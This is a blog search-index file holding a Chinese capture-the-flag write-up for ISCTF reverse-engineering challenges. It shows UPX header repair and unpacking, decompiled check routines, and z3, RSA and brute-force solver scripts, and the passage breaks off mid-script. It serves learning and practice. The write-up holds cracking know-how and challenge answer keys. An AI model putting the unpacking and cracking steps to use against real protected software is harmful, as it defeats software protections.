<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ISCTF</title>
    <link href="/2023/11/29/%E7%AE%80%E5%8D%95%E9%A2%98/"/>
    <url>/2023/11/29/%E7%AE%80%E5%8D%95%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>crakeme<br>用exeinfo打开,发现又upx壳<br>直接上脱壳<br>报错upx: D:\google\a\crackme.exe: CantUnpackException: file is possibly modified&#x2F;hacked&#x2F;protected; take care!<br>网上搜一下大概率是数据段被修改了,导致upx不敢脱壳,两种方式解决,手动改回来,或者用改过的upx<br>我选择手动更省事,exeinfo可以看到一些相关信息,<br><img src="/img/postimg/3/1-1.png" alt="image.png"><br>这里看出再name那一行中upx被改为了pfx,通过010改回来后就可以正常脱壳<br>脱完后放进ida中就看到flag<br>easyre</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">_main();<br><span class="hljs-built_in">strcpy</span>(v4, <span class="hljs-string">&quot;]P_ISRF^PCY[I_YWERYC&quot;</span>);<br><span class="hljs-built_in">memset</span>(v5, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v5));<br>v6 = <span class="hljs-number">0</span>;<br>v7 = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input your strings:&quot;</span>);<br>gets(Str);<br>v10 = <span class="hljs-built_in">strlen</span>(Str);<br><span class="hljs-keyword">while</span> ( Str[i] )<br>&#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v10; ++i )<br>        v8[i] = Str[i] ^ <span class="hljs-number">0x11</span>;<br>&#125;<br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v10; ++i )<br>&#123;<br>    <span class="hljs-keyword">if</span> ( v8[i] == <span class="hljs-string">&#x27;B&#x27;</span> || v8[i] == <span class="hljs-string">&#x27;X&#x27;</span> )<br>        v8[i] = <span class="hljs-number">155</span> - v8[i];<br>&#125;<br><span class="hljs-keyword">for</span> ( i = v10 - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i )<br>    v8[v10 - i - <span class="hljs-number">1</span>] = v8[i];<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> ( v10 &gt; <span class="hljs-number">0</span> )<br>&#123;<br>    <span class="hljs-keyword">if</span> ( v8[i] == v4[i] )<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;yes!!!&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;no!!!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>字符串定位后,看到关键代码,代码不难,大致看一下逻辑关系就可以理出来<br>str-&gt;v8-&gt;替换一些字符-&gt;字符串对称交换(但是似乎代码有问题)<br>逻辑很简单,代码也很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;]P_ISRF^PCY[I_YWERYC&#x27;</span><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(a[i]) == <span class="hljs-number">155</span> - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;B&#x27;</span>):<br>        flag.append(<span class="hljs-string">&#x27;B&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(a[i]) == <span class="hljs-number">155</span> - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;X&#x27;</span>):<br>        flag.append(<span class="hljs-string">&#x27;X&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flag.append(a[i])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(flag[i]) ^ <span class="hljs-number">0x11</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>babyre<br>下载下来后,发现图标是python打包,于是使用pyinstxtractor和uncomple6将其中主要文件反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">p+q=<span class="hljs-number">292884018782106151080211087047278002613718113661882871562870811030932129300110050822187903340426820507419488984883216665816506575312384940488196435920320779296487709207011656728480651848786849994095965852212548311864730225380390740637527033103610408592664948012814290769567441038868614508362013860087396409860</span><br>(p+<span class="hljs-number">1</span>)*(q+<span class="hljs-number">1</span>)=<span class="hljs-number">21292789073160227295768319780997976991300923684414991432030077313041762314144710093780468352616448047534339208324518089727210764843655182515955359309813600286949887218916518346391288151954579692912105787780604137276300957046899460796651855983154616583709095921532639371311099659697834887064510351319531902433355833604752638757132129136704458119767279776712516825379722837005380965686817229771252693736534397063201880826010273930761767650438638395019411119979149337260776965247144705915951674697425506236801595477159432369862377378306461809669885764689526096087635635247658396780671976617716801660025870405374520076160</span><br>c=<span class="hljs-number">5203005542361323780340103662023144468501161788183930759975924790394097999367062944602228590598053194005601497154183700604614648980958953643596732510635460233363517206803267054976506058495592964781868943617992245808463957957161100800155936109928340808755112091651619258385206684038063600864669934451439637410568700470057362554045334836098013308228518175901113235436257998397401389511926288739759268080251377782356779624616546966237213737535252748926042086203600860251557074440685879354169866206490962331203234019516485700964227924668452181975961352914304357731769081382406940750260817547299552705287482926593175925396</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">&#x27;ISCTF&#123;******************&#125;&#x27;</span><br>flags = flag.encode()<br>e = <span class="hljs-number">65537</span><br>p = libnum.generate_prime(<span class="hljs-number">1024</span>)<br>q = libnum.generate_prime(<span class="hljs-number">1024</span>)<br>n = p * q<br>m = bytes_to_long(flags)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br>output = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>output.write(<span class="hljs-string">&#x27;p+q =&#x27;</span> + <span class="hljs-built_in">str</span>(p + q) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>output.write(<span class="hljs-string">&#x27;(p+1)*(q+1)=&#x27;</span> + <span class="hljs-built_in">str</span>((p + <span class="hljs-number">1</span>) * (q + <span class="hljs-number">1</span>)) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>output.write(<span class="hljs-string">&#x27;c=&#x27;</span> + <span class="hljs-built_in">str</span>(c) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>output.close()<br></code></pre></td></tr></table></figure><p>得到一下这些代码,这段代码我想挺久想不出来<br>大概思路是,通过(q+1)<em>(p+1)和q+p得出pq的值也就是n,得出pow(i</em>n+c,1&#x2F;e)&#x3D;m,最后算出bytes_to_long(flags)<br>但是我怎么算都不行,感觉精度都不够,最后由我沈总秒杀,直接出flag<br>easy_z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please input flag:&quot;</span>)<br>flag = <span class="hljs-built_in">input</span>()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag)!=<span class="hljs-number">42</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Check your length!&quot;</span>)<br>exit()<br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>s=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> flag[i*<span class="hljs-number">7</span>:i*<span class="hljs-number">7</span>+<span class="hljs-number">7</span>]:<br>s+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(j))[<span class="hljs-number">2</span>:]<br>l.append(<span class="hljs-built_in">int</span>(s,<span class="hljs-number">16</span>))<br><span class="hljs-keyword">if</span> (<br>(<span class="hljs-number">593</span>*l[<span class="hljs-number">5</span>] + <span class="hljs-number">997</span>*l[<span class="hljs-number">0</span>] + <span class="hljs-number">811</span>*l[<span class="hljs-number">1</span>] + <span class="hljs-number">258</span>*l[<span class="hljs-number">2</span>] + <span class="hljs-number">829</span>*l[<span class="hljs-number">3</span>] + <span class="hljs-number">532</span>*l[<span class="hljs-number">4</span>])== <span class="hljs-number">0x54eb02012bed42c08</span> <span class="hljs-keyword">and</span> \<br>(<span class="hljs-number">605</span>*l[<span class="hljs-number">4</span>] + <span class="hljs-number">686</span>*l[<span class="hljs-number">5</span>] + <span class="hljs-number">328</span>*l[<span class="hljs-number">0</span>] + <span class="hljs-number">602</span>*l[<span class="hljs-number">1</span>] + <span class="hljs-number">695</span>*l[<span class="hljs-number">2</span>] + <span class="hljs-number">576</span>*l[<span class="hljs-number">3</span>])== <span class="hljs-number">0x4f039a9f601affc3a</span> <span class="hljs-keyword">and</span> \<br>(<span class="hljs-number">373</span>*l[<span class="hljs-number">3</span>] + <span class="hljs-number">512</span>*l[<span class="hljs-number">4</span>] + <span class="hljs-number">449</span>*l[<span class="hljs-number">5</span>] + <span class="hljs-number">756</span>*l[<span class="hljs-number">0</span>] + <span class="hljs-number">448</span>*l[<span class="hljs-number">1</span>] + <span class="hljs-number">580</span>*l[<span class="hljs-number">2</span>])== <span class="hljs-number">0x442b62c4ad653e7d9</span> <span class="hljs-keyword">and</span> \<br>(<span class="hljs-number">560</span>*l[<span class="hljs-number">2</span>] + <span class="hljs-number">635</span>*l[<span class="hljs-number">3</span>] + <span class="hljs-number">422</span>*l[<span class="hljs-number">4</span>] + <span class="hljs-number">971</span>*l[<span class="hljs-number">5</span>] + <span class="hljs-number">855</span>*l[<span class="hljs-number">0</span>] + <span class="hljs-number">597</span>*l[<span class="hljs-number">1</span>])== <span class="hljs-number">0x588aabb6a4cb26838</span> <span class="hljs-keyword">and</span> \<br>(<span class="hljs-number">717</span>*l[<span class="hljs-number">1</span>] + <span class="hljs-number">507</span>*l[<span class="hljs-number">2</span>] + <span class="hljs-number">388</span>*l[<span class="hljs-number">3</span>] + <span class="hljs-number">925</span>*l[<span class="hljs-number">4</span>] + <span class="hljs-number">324</span>*l[<span class="hljs-number">5</span>] + <span class="hljs-number">524</span>*l[<span class="hljs-number">0</span>])== <span class="hljs-number">0x48f8e42ac70c9af91</span> <span class="hljs-keyword">and</span> \<br>(<span class="hljs-number">312</span>*l[<span class="hljs-number">0</span>] + <span class="hljs-number">368</span>*l[<span class="hljs-number">1</span>] + <span class="hljs-number">884</span>*l[<span class="hljs-number">2</span>] + <span class="hljs-number">518</span>*l[<span class="hljs-number">3</span>] + <span class="hljs-number">495</span>*l[<span class="hljs-number">4</span>] + <span class="hljs-number">414</span>*l[<span class="hljs-number">5</span>])== <span class="hljs-number">0x4656c19578a6b1170</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Good job!&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong\nTry again!!!&quot;</span>)<br>exit()<br></code></pre></td></tr></table></figure><p>给出了python文件必然是用z3库来解方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>l=[<span class="hljs-number">0</span>]*<span class="hljs-number">6</span><br>a,b,c,d,e,f=Ints(<span class="hljs-string">&#x27;a b c d e f&#x27;</span>)<br>z=Solver()<br>z.add((<span class="hljs-number">593</span>*f + <span class="hljs-number">997</span>*a + <span class="hljs-number">811</span>*b + <span class="hljs-number">258</span>*c + <span class="hljs-number">829</span>*d + <span class="hljs-number">532</span>*e)== <span class="hljs-number">0x54eb02012bed42c08</span>)<br>z.add((<span class="hljs-number">605</span>*e + <span class="hljs-number">686</span>*f + <span class="hljs-number">328</span>*a + <span class="hljs-number">602</span>*b + <span class="hljs-number">695</span>*c + <span class="hljs-number">576</span>*d)== <span class="hljs-number">0x4f039a9f601affc3a</span>)<br>z.add((<span class="hljs-number">373</span>*d + <span class="hljs-number">512</span>*e + <span class="hljs-number">449</span>*f + <span class="hljs-number">756</span>*a + <span class="hljs-number">448</span>*b + <span class="hljs-number">580</span>*c)== <span class="hljs-number">0x442b62c4ad653e7d9</span>)<br>z.add((<span class="hljs-number">560</span>*c + <span class="hljs-number">635</span>*d + <span class="hljs-number">422</span>*e + <span class="hljs-number">971</span>*f + <span class="hljs-number">855</span>*a + <span class="hljs-number">597</span>*b)== <span class="hljs-number">0x588aabb6a4cb26838</span>)<br>z.add((<span class="hljs-number">717</span>*b + <span class="hljs-number">507</span>*c + <span class="hljs-number">388</span>*d + <span class="hljs-number">925</span>*e + <span class="hljs-number">324</span>*f + <span class="hljs-number">524</span>*a)== <span class="hljs-number">0x48f8e42ac70c9af91</span>)<br>z.add((<span class="hljs-number">312</span>*a + <span class="hljs-number">368</span>*b + <span class="hljs-number">884</span>*c + <span class="hljs-number">518</span>*d + <span class="hljs-number">495</span>*e + <span class="hljs-number">414</span>*f)== <span class="hljs-number">0x4656c19578a6b1170</span>)<br><span class="hljs-built_in">print</span>(z.check())<br><span class="hljs-built_in">print</span>(z.model())<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">[d = <span class="hljs-number">32765855640286324</span>,<br> b = <span class="hljs-number">13615593641303915</span>,<br> a = <span class="hljs-number">20639221941697358</span>,<br> f = <span class="hljs-number">26860403902456189</span>,<br> c = <span class="hljs-number">31015537033047360</span>,<br> e = <span class="hljs-number">28554726411354222</span>]<br></code></pre></td></tr></table></figure><p>得到这串答案,这串是由将flag每7个字符分一段的方式分为了6段,每段将他们的ascii的16进制数拼接然后转为10进制得到的结果,然后随便找个16进制转数组,或者自己写也可以,得到flag<br>where<br>放入32位ida中,通过字符串找到位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>    <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">3</span> )<br>    &#123;<br>        <span class="hljs-keyword">if</span> ( a1 != <span class="hljs-number">100</span> )<br>        &#123;<br>            <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">404</span> )<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debug Error&quot;</span>);<br>                ExitProcess(<span class="hljs-number">0</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">666</span> )<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please try again.&quot;</span>);<br>                ExitProcess(<span class="hljs-number">0</span>);<br>            &#125;<br>            LABEL_18:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;???&quot;</span>);<br>            ExitProcess(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Yeah!You are right!\nThe flag is flag&#123;input1+input2&#125;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">switch</span> ( a1 )<br>        &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now,You need input password.&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid ID&quot;</span>);<br>                ExitProcess(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Length is incorrect!&quot;</span>);<br>                ExitProcess(<span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome, please enter the correct ID&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">goto</span> LABEL_18;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到已经出现了flag,然后发现进入flag分支的条件是a1&#x3D;100就可以了,然后回溯到被调用的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v16);<br>  v15 = v16 / <span class="hljs-number">10000</span>;<br>  v14 = v16 % <span class="hljs-number">10000</span> / <span class="hljs-number">100</span>;<br>  v13 = v16 % <span class="hljs-number">10000</span> % <span class="hljs-number">100</span>;<br>  v5 = v14;<br>  v3 = sub_401390(<span class="hljs-number">7</span> * v14, <span class="hljs-number">1</span>);<br>  v4 = sub_401390(<span class="hljs-number">11</span> * (<span class="hljs-number">13</span> * v3 + v13 + <span class="hljs-number">3</span>), v5);<br>  v17 = ((v4 - v13) / <span class="hljs-number">10</span> + <span class="hljs-number">11</span>) ^ <span class="hljs-number">0x104B4</span>;<br>  <span class="hljs-keyword">if</span> ( (v16 &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> || v16 &lt; <span class="hljs-number">233</span> || v15 &gt; <span class="hljs-number">9999</span> || v14 &gt; <span class="hljs-number">12</span> || v13 &gt; <span class="hljs-number">32</span> || v17 * (v14 + v13 + v15) != <span class="hljs-number">136398636</span> )<br>    sub_4013C0(<span class="hljs-number">0</span>);<br>  sub_4013C0(<span class="hljs-number">3</span>);<br>  <span class="hljs-keyword">if</span> ( --File._cnt &lt; <span class="hljs-number">0</span> )<br>    _filbuf(&amp;File);<br>  <span class="hljs-keyword">else</span><br>    ++File._ptr;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, &amp;Str);<br>  v18 = <span class="hljs-built_in">strlen</span>(&amp;Str);<br>  <span class="hljs-keyword">if</span> ( v18 != <span class="hljs-number">32</span> )<br>    sub_4013C0(<span class="hljs-number">1</span>);<br>  v19 = &amp;Str;<br>  MEMORY[<span class="hljs-number">0</span>] = v16;<br>  NtClose = GetProcAddress(::hModule, <span class="hljs-string">&quot;NtClose&quot;</span>);<br>  (NtClose)(v17, v6, sub_401660);<br>  <span class="hljs-keyword">if</span> ( sub_4019B0(&amp;Str) == <span class="hljs-number">-1</span> )<br>    sub_4013C0(<span class="hljs-number">666</span>);<br>  <span class="hljs-keyword">else</span><br>    sub_4013C0(<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><p>这一段是比较重要的代码,整个代码中输入了一个数字,一个字符串<br>数字通过判断使得a1&#x3D;3,而字符串就是上面代码所说的密码,<br>输入数字的代码好解决,翻译过来就是数字是十万位以上,千百位小于12,个十位小于32,整个数字大于233<br>然后有个sub_401390函数,返回这个算式~(a2 + ~a1)<br>v3,v4也可以算出来,然后使用列举爆破就行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">13</span>)</span>:<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-title function_">range</span><span class="hljs-params">(<span class="hljs-number">33</span>)</span>:<br>        v3 = ~(~(<span class="hljs-number">7</span> * i) + <span class="hljs-number">1</span>)<br>        v4 = ~(~(<span class="hljs-number">11</span> * (<span class="hljs-number">13</span> * v3 + j + <span class="hljs-number">3</span>)) + i)<br>        v19 = <span class="hljs-type">int</span>((v4 - j) / <span class="hljs-number">10</span> + <span class="hljs-number">11</span>) ^ <span class="hljs-number">0x104B4</span><br>        print(<span class="hljs-number">136398636</span>/v19)<br><br></code></pre></td></tr></table></figure><p>这样会得到很多值,但是只有一个是被除清了的2046,所以v19&#x3D;&#x3D;2046,然后我们就可以知道v19&#x3D;&#x3D;2046时i和j<br>也就得到了整个数字,20220222,可以运行程序验证<br>然后继续向下分析,最终要使得传入100,最后刚好就是,不过要先将str进行判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i )<br>  *(i + a1) ^= byte_432034[i];<br><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">30</span>; j += <span class="hljs-number">2</span> )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( *(j + a1) &gt;= *(j + a1 + <span class="hljs-number">2</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">32</span>; k += <span class="hljs-number">2</span> )<br>  byte_434D3C[<span class="hljs-number">300</span> * *(k + a1) + *(k + a1 + <span class="hljs-number">1</span>)] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> ( l = <span class="hljs-number">0</span>; l &lt; <span class="hljs-number">300</span>; ++l )<br>&#123;<br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">300</span>; ++m )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( byte_434D3C[<span class="hljs-number">300</span> * l + m] != byte_41C0A0[<span class="hljs-number">300</span> * l + m] )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>这里byte_[432034]和byte_41c0a0是知道了<br>通过将byte_434d3c赋值,等于byte41c0a0,由于赋值为一,所以重点是索引,<br>byte41c0a0的范围很大,有90000个,所以需要使用idc(ida中的脚本)来输出索引</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> s=<span class="hljs-number">0x41c0a0</span>;<br><span class="hljs-keyword">auto</span> i=<span class="hljs-number">0</span>;<br>Message(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(;i&lt;=<span class="hljs-number">90000</span>;i++)&#123;<br>    <span class="hljs-keyword">if</span>(Byte(s+i)==<span class="hljs-number">1</span>)<br>    Message(<span class="hljs-string">&quot;%d,&quot;</span>,i);<br>&#125;<br><span class="hljs-number">9015</span>,<span class="hljs-number">12928</span>,<span class="hljs-number">25805</span>,<span class="hljs-number">29200</span>,<span class="hljs-number">36021</span>,<span class="hljs-number">40589</span>,<span class="hljs-number">41428</span>,<span class="hljs-number">46450</span>,<span class="hljs-number">54099</span>,<span class="hljs-number">56800</span>,<span class="hljs-number">60001</span>,<span class="hljs-number">66213</span>,<span class="hljs-number">67554</span>,<span class="hljs-number">70735</span>,<span class="hljs-number">73866</span>,<span class="hljs-number">76755</span>,<span class="hljs-number">90000</span>,<br></code></pre></td></tr></table></figure><p>得到索引后再来分析程序<br>第一个for循环是再异或,第二个for循环作为一个限制条件偶数列是递增,第三个for循环才是重点,通过一个表达式来决定byte434d3c的哪个值是1,于是我们可以写出代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">key = [<span class="hljs-number">241</span>, <span class="hljs-number">239</span>, <span class="hljs-number">97</span>, <span class="hljs-number">187</span>, <span class="hljs-number">201</span>, <span class="hljs-number">69</span>, <span class="hljs-number">87</span>, <span class="hljs-number">67</span>, <span class="hljs-number">54</span>, <span class="hljs-number">235</span>, <span class="hljs-number">195</span>, <span class="hljs-number">245</span>, <span class="hljs-number">97</span>, <span class="hljs-number">31</span>, <span class="hljs-number">224</span>, <span class="hljs-number">237</span>, <span class="hljs-number">95</span>, <span class="hljs-number">25</span>, <span class="hljs-number">195</span>, <span class="hljs-number">131</span>, <span class="hljs-number">11</span>, <span class="hljs-number">103</span>, <span class="hljs-number">91</span>, <span class="hljs-number">68</span>, <span class="hljs-number">122</span>,<br>       <span class="hljs-number">157</span>, <span class="hljs-number">178</span>, <span class="hljs-number">126</span>, <span class="hljs-number">245</span>, <span class="hljs-number">181</span>, <span class="hljs-number">34</span>, <span class="hljs-number">101</span>]<br>m = [<span class="hljs-number">9015</span>, <span class="hljs-number">12928</span>, <span 